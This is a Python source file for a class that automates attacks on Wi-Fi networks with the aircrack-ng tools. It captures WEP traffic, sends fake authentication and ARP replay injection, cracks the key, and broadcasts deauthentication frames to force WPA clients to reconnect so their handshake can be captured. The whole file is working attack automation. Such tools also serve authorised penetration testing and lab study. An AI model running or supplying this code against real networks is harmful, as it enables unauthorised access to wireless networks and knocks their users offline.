#!/usr/bin/env python3
import time
from subprocess import TimeoutExpired, run, PIPE

from tests import Test
from tools.config import Config
from tools.util import remove_colon


class Aircrack:
    def aircrack_wep(self, target):
        # Cracking
        crack = None
        try:
            crack = run(["aircrack-ng", "-q", "-b", target.bssid, target.target_ivs_file + "crackwep" + '-01.cap'],
                        stdout=PIPE, timeout=Config.aircrack_timeout)
        except TimeoutExpired:
            print("WEP crack timeout")
        return crack

    def crack_wep(self, target):
        crack = self.aircrack_wep(target)
        code = 3
        if crack is not None:  # if not timeout
            code = crack.returncode
            results = crack.stdout.decode()
            for line in results.splitlines():
                print(line)  # debug
                if "KEY FOUND" in line:
                    target.key = remove_colon(line[13:-4])
                    code = 0
                elif "Got no data packets" in line:
                    code = 3
        self.capture.kill()
        self.auth.kill()
        self.arp.kill()
        return code

    def auto_crack_wep(self, target):
        self.capture = Test.airodump.capture_iv(target, "crackwep")
        time.sleep(5)
        self.auth = Test.aireplay.fake_auth(target)
        time.sleep(5)
        self.arp = Test.aireplay.arp_requesting(target)
        time.sleep(15)
        code = self.crack_wep(target)
        return code

    def aircrack_handshake_check(self, target):
        # Checking if the pcap file contains a 4-way handshake
        handshake = 1
        try:
            crack = run(["aircrack-ng", target.target_ivs_file + "handshake" + '-01.cap'],
                        stdout=PIPE, timeout=10)
        except TimeoutExpired:
            print("WPA handshake check timeout")
        if "handshake)" in crack.stdout.decode():
            handshake = 0
        return handshake

    def auto_capture_wpa(self, target):
        self.capture = Test.airodump.capture_iv(target, "handshake")
        time.sleep(5)
        self.deauth = Test.aireplay.deauth_broadcast(target)
        time.sleep(5)
        try:
            self.deauth.wait(timeout=10)
        except TimeoutExpired:
            pass
        time.sleep(10)
        self.capture.kill()
        return self.aircrack_handshake_check(target)

    def auto_crack_wep2(self, target):
        crack = run(
            ["./wepcrack.sh", Test.interface.name, target.bssid, target.channel, target.target_ivs_file + "crackwep"],
            stdout=PIPE, timeout=300)
        code = crack.returncode
        results = crack.stdout.decode()
        for line in results.splitlines():
            print(line)  # debug
            if "KEY FOUND" in line:
                target.key = remove_colon(line[13:-4])
                code = 0
            elif "Got no data packets" in line:
                code = 3
        return code
